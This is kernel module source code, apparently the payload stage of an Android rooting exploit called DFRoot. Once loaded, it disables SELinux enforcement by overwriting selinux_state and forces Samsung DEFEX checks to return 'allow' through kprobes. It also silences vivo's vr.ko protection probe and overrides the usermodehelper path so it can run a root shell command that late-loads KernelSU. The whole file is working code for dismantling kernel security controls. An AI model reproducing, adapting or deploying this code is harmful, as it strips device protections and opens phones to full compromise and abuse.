#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/string.h>
#include <linux/tracepoint.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);

static int soft_reboot;
module_param(soft_reboot, int, 0);

/* The exploit stages the installed manager's ksud at this path and passes the
 * package name through insmod, so the late-load call matches the manager. */
static char package_name[64] = "me.weishu.kernelsu";
module_param_string(package_name, package_name, sizeof(package_name), 0);

static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* x0 = DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip body: return to caller */
    return 1;
}

/* vivo's vr.ko installs a sys_exit tracepoint probe that kills any euid-0
 * process carrying its app-origin tag, which includes the ksud this module
 * spawns. Zeroing the tracepoint head's funcs list stops the probe firing for
 * every process; the iterator skips a NULL funcs and the commit_creds probe
 * still runs. Resolved by symbol, so unlike ghostlock's per-KMI
 * off_vr_sys_exit_tp this needs no hand-carried offset.
 *
 * Only touch funcs when vr.ko actually owns a probe in the list. On a kernel
 * with no vr.ko the tracepoint is either empty or a legitimate user's (perf,
 * ftrace, BPF), and clearing it would break them. The probe struct has no
 * owning-module field on these KMIs (it only landed upstream in 6.10), so this
 * maps each probe's function back to its module with __module_address(). */
static void neutralize_vr(kallsyms_lookup_name_t get_addr)
{
    struct tracepoint *tp =
        (struct tracepoint *)get_addr("__tracepoint_sys_exit");
    struct module *(*module_at)(unsigned long) =
        (struct module *(*)(unsigned long))get_addr("__module_address");
    struct tracepoint_func *funcs, *f;

    if (!tp) {
        pr_info("dfroot: __tracepoint_sys_exit not found; vr.ko untouched\n");
        return;
    }
    funcs = rcu_dereference_protected(tp->funcs, 1);
    if (!funcs) {
        pr_info("dfroot: sys_exit tracepoint empty; vr.ko not present\n");
        return;
    }
    if (!module_at) {
        pr_info("dfroot: __module_address unavailable; sys_exit left alone\n");
        return;
    }
    for (f = funcs; f->func; f++) {
        struct module *owner = module_at((unsigned long)f->func);
        /* same match ghostlock uses: the "vr" module, or a "vr_*" sibling */
        if (!owner) continue;
        if (strncmp(owner->name, "vr", 2) != 0) continue;
        if (owner->name[2] != '\0' && owner->name[2] != '_') continue;
        WRITE_ONCE(tp->funcs, NULL);
        pr_info("dfroot: vr.ko sys_exit probe neutralized (tp=%px)\n", tp);
        return;
    }
    pr_info("dfroot: sys_exit tracepoint has no vr.ko probe; left alone\n");
}

static int __nocfi __init dirtyfrag_init(void)
{
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    struct kprobe kln_kp;
    struct kprobe defex_kp;
    struct kprobe umh_kp;
    void *info;
    int ret;

    static const char sh[] = "/system/bin/sh";
    static char cmd[768];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };

    /* Resolve ksud at runtime. The staged path is per-app, so fall back to the
     * manager's own libksud.so under /data/app, keyed off the package name the
     * exploit passes through insmod. Skip the load when kernelsu is already
     * there. Report through the markers the exploit polls for, so an
     * already-loaded module still reads as success. */
    if (soft_reboot)
        snprintf(cmd, sizeof(cmd),
                 "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
                 "KSUD=/data/user_de/0/df.root/ksud; "
                 "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path '*/%s*/lib/arm64/libksud.so' 2>/dev/null | head -1); "
                 "[ -n \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud; "
                 "\"$KSUD\" late-load --package-name %s || { touch /dev/dfm1; exit 1; }; "
                 "touch /dev/dfm0; \"$KSUD\" soft-reboot",
                 package_name, package_name);
    else
        snprintf(cmd, sizeof(cmd),
                 "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
                 "KSUD=/data/user_de/0/df.root/ksud; "
                 "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path '*/%s*/lib/arm64/libksud.so' 2>/dev/null | head -1); "
                 "[ -n \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud; "
                 "\"$KSUD\" late-load --package-name %s && touch /dev/dfm0 || touch /dev/dfm1",
                 package_name, package_name);

    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    /* before the usermodehelper below spawns ksud as uid 0 */
    neutralize_vr(get_addr);

    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    defex_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
                                .pre_handler = defex_pre_handler };
    if (register_kprobe(&defex_kp) < 0)
        pr_err("dfroot: task_defex_enforce not found\n");
    else
        pr_info("dfroot: task_defex_enforce hooked\n");

    umh_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_user_exec"),
                              .pre_handler = defex_pre_handler };
    if (register_kprobe(&umh_kp) < 0)
        pr_err("dfroot: task_defex_user_exec not found\n");
    else
        pr_info("dfroot: task_defex_user_exec hooked\n");

    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return -EINVAL;
    }
    /* bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to "" */
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);

    if (defex_kp.addr) unregister_kprobe(&defex_kp);
    if (umh_kp.addr)   unregister_kprobe(&umh_kp);
    return -E2BIG; /* return any error to unload module */
}

/* no module_exit: we never unload; saves .exit sections */
module_init(dirtyfrag_init);
